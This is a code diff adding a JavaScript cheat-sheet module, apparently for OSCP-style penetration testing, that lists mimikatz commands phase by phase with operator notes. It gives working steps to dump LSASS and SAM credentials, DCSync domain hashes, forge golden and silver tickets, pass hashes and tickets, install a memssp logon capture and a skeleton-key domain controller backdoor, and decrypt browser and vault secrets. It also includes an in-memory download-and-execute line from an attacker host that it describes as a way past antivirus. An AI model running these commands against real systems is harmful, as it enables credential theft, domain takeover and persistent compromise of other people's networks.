@@ -1,0 +1,42 @@
+// MIMIKATZ — comprehensive reference, organized by module. Run as admin/SYSTEM.
+// Load: .\mimikatz.exe   (or Invoke-Mimikatz for in-memory / remote via PSSession)
+export default function mimikatz(v){const{D,DCIP,U,SEC,Q,LHOST}=v;return{
+  name:"mimikatz",groups:[
+   {phase:"0 — Load + the mandatory first command",cmds:[
+     {label:"Run it + enable debug",cmd:`.\\mimikatz.exe\nprivilege::debug          # MUST say 'Privilege 20 OK'\nlog mimi.log              # tee everything to a file`,note:"privilege::debug grants SeDebug so you can read other processes' memory (LSASS). If it errors, you're not admin — nothing else works. log captures output so you don't lose creds when the shell dies. AV eats mimikatz.exe on sight; prefer Invoke-Mimikatz (in-memory) or an obfuscated build."},
+     {label:"In-memory (no disk, dodges AV)",cmd:`IEX(New-Object Net.WebClient).DownloadString('http://${LHOST}/Invoke-Mimikatz.ps1')\nInvoke-Mimikatz -Command '\"privilege::debug\" \"sekurlsa::logonpasswords\"'`,note:"Reflective load — never touches disk. Commands go in -Command as quoted, space-separated strings. This is the OSCP-friendly way past Defender. Host Invoke-Mimikatz.ps1 on your python server."},
+     {label:"Remote (dump another box over PSSession)",cmd:`$p=ConvertTo-SecureString '${SEC}' -AsPlainText -Force\n$c=New-Object System.Management.Automation.PSCredential('${D}\\${U}',$p)\n$s=New-PSSession -ComputerName TARGET.${D} -Credential $c\n. .\\Invoke-Mimikatz.ps1\nInvoke-Command -ScriptBlock \${function:Invoke-Mimikatz} -Session $s`,note:"Runs mimikatz in the REMOTE box's memory — dumps who's logged in THERE without sitting on it. The lateral-movement engine: dump a box you're admin on, steal a higher-priv session, hop."},
+   ]},
+   {phase:"1 — sekurlsa (creds from LSASS memory)",cmds:[
+     {label:"★ logonpasswords — the big one",cmd:`sekurlsa::logonpasswords`,note:"Dumps NTLM hashes (+ cleartext on old/WDigest-on boxes) for EVERY session in LSASS memory. This is what you run first after privilege::debug. A domain-admin session here = the domain. Machine accounts (HOST$) are noise."},
+     {label:"msv — just the NTLM hashes",cmd:`sekurlsa::msv`,note:"Quieter — only the NTLM/SHA1, no full dump. Faster to read when you just want a hash to PtH."},
+     {label:"ekeys — AES keys (for overpass-the-hash)",cmd:`sekurlsa::ekeys`,note:"Kerberos AES256/128 keys of logged-in users. Use with asktgt /aes256 for overpass-the-hash — stealthier than RC4/NTLM (no encryption downgrade alert)."},
+     {label:"tickets — Kerberos tickets in memory",cmd:`sekurlsa::tickets /export`,note:"Exports all TGT/TGS tickets to .kirbi files → pass-the-ticket (kerberos::ptt). /export writes them to disk in the current dir."},
+     {label:"pth — pass the hash (spawn as another user)",cmd:`sekurlsa::pth /user:Administrator /domain:${D} /ntlm:<NTLM> /run:cmd.exe`,note:"Spawns a process with another user's hash injected — a new cmd running AS them. Overpass-the-hash variant: add /aes256:<key> instead of /ntlm. The Windows-side PtH."},
+     {label:"wdigest / dpapi (extra credential material)",cmd:`sekurlsa::wdigest\nsekurlsa::dpapi          # DPAPI master keys from memory`,note:"wdigest = cleartext if the box cached it (old/misconfigured). sekurlsa::dpapi pulls DPAPI keys to decrypt browser/vault secrets."},
+   ]},
+   {phase:"2 — lsadump (creds from registry/DB, needs SYSTEM)",cmds:[
+     {label:"sam — local account hashes",cmd:`token::elevate\nlsadump::sam`,note:"Local SAM hashes (needs SYSTEM — token::elevate first). The local Administrator hash → PtH across the domain. Same as secretsdump --sam but on-box."},
+     {label:"secrets — LSA secrets (service creds, often cleartext)",cmd:`token::elevate\nlsadump::secrets`,note:"LSA secrets = service account passwords (frequently CLEARTEXT), autologon, cached machine creds. The jackpot — cleartext creds you don't have to crack."},
+     {label:"cache — cached domain logons (DCC2)",cmd:`lsadump::cache`,note:"Last domain users who logged in here, as mscash2 → hashcat -m 2100 (slow). Crack only if you lack a cleartext for that user."},
+     {label:"★ dcsync — pull any hash from the DC (no LSASS)",cmd:`lsadump::dcsync /domain:${D} /user:krbtgt\nlsadump::dcsync /domain:${D} /user:Administrator\nlsadump::dcsync /domain:${D} /all /csv`,note:"Replicates the DC's directory — dump ANY account's hash without touching LSASS. Needs DA/replication rights. krbtgt → golden ticket. /all /csv = whole domain. The cleanest domain-dump."},
+     {label:"lsa / backupkeys",cmd:`lsadump::lsa /inject /name:krbtgt\nlsadump::backupkeys /system:dc.${D}`,note:"lsa /inject = alternative krbtgt pull on the DC. backupkeys = the DPAPI DOMAIN backup key → decrypt ANY user's DPAPI secrets domain-wide (huge for pillaging)."},
+   ]},
+   {phase:"3 — kerberos (ticket forging + PtT)",cmds:[
+     {label:"golden ticket (need krbtgt hash + domain SID)",cmd:`kerberos::purge\nkerberos::golden /user:Administrator /domain:${D} /sid:${v.SID||'<SID>'} /krbtgt:<KRBTGT_HASH> /ptt\nmisc::cmd`,note:"Forge a TGT as anyone, signed with krbtgt's key, valid ~10yr. /ptt injects it into the session; misc::cmd spawns a cmd that inherits it → PsExec.exe \\\\dc (hostname forces Kerberos). Use /aes256 instead of /krbtgt for stealth."},
+     {label:"silver ticket (service account hash)",cmd:`kerberos::golden /user:Administrator /domain:${D} /sid:${v.SID||'<SID>'} /target:host.${D} /service:cifs /rc4:<SERVICE_HASH> /ptt`,note:"Scoped to ONE service on ONE host — uses the service (or machine) account hash, not krbtgt. Never touches the DC → stealthier. /service: cifs (shares), http (winrm), mssqlsvc, host (tasks/wmi)."},
+     {label:"ptt — pass the ticket",cmd:`kerberos::ptt ticket.kirbi\nkerberos::list          # confirm it loaded`,note:"Inject a .kirbi/.ccache into the session. After ptt, use hostname-based tools (they'll use Kerberos). ptc = pass a ccache specifically."},
+     {label:"list / purge",cmd:`kerberos::list /export     # list + dump tickets to .kirbi\nkerberos::purge            # clear all tickets (before injecting a forged one)`,note:"purge first when forging — stale tickets cause conflicts. list /export is another way to grab tickets for PtT."},
+   ]},
+   {phase:"4 — token + misc + persistence",cmds:[
+     {label:"token::elevate — become SYSTEM",cmd:`token::elevate\n# elevate to a specific user's token:\ntoken::elevate /domainadmin`,note:"Impersonate a token present on the box. token::elevate → SYSTEM (needed before lsadump::sam/secrets). /domainadmin grabs a DA token if one's available on this host."},
+     {label:"token::run / misc::cmd",cmd:`token::run /process:cmd.exe\nmisc::cmd`,note:"Spawn a process under an elevated token / open a new cmd. misc::cmd is the quick 'give me a shell in this context' after golden/ptt."},
+     {label:"misc::memssp — capture NEW logons (Cred Guard bypass)",cmd:`privilege::debug\nmisc::memssp\n# then WAIT for logons; plaintext lands in:\ntype C:\\Windows\\System32\\mimilsa.log`,note:"Registers a malicious SSP in memory — every subsequent logon's PLAINTEXT password is written to mimilsa.log. Beats Credential Guard (intercepts at auth time, before isolation). Non-persistent."},
+     {label:"misc::skeleton — DC backdoor (lab only)",cmd:`privilege::debug\nmisc::skeleton`,note:"Patches LSASS on the DC so EVERY account accepts a master password ('mimikatz') alongside its real one. Loud, persistent-ish, DC-only. Know it exists; rarely the OSCP move."},
+   ]},
+   {phase:"5 — dpapi + vault + crypto (secrets pillage)",cmds:[
+     {label:"vault / cred",cmd:`vault::cred /patch\nvault::list`,note:"Windows Credential Manager secrets — saved RDP/web/network creds in cleartext. /patch dumps them. Often holds the cred to the next box."},
+     {label:"dpapi — browser + RDP + files",cmd:`dpapi::chrome /in:"%localappdata%\\Google\\Chrome\\User Data\\Default\\Login Data"\ndpapi::rdg /in:<file.rdg>\ndpapi::cred /in:<credfile>`,note:"Decrypt DPAPI-protected secrets: chrome = saved browser passwords, rdg = Remote Desktop Manager configs, cred = Credential Manager blobs. Pair with sekurlsa::dpapi (keys) or backupkeys (domain-wide)."},
+     {label:"crypto — export certs (incl. non-exportable)",cmd:`crypto::capi\ncrypto::certificates /export\ncrypto::certificates /systemstore:LOCAL_MACHINE /export`,note:"Export certificates including ones marked non-exportable (crypto::capi patches that). Machine certs → potential auth-as-machine / ADCS chains."},
+   ]},
+  ]};}
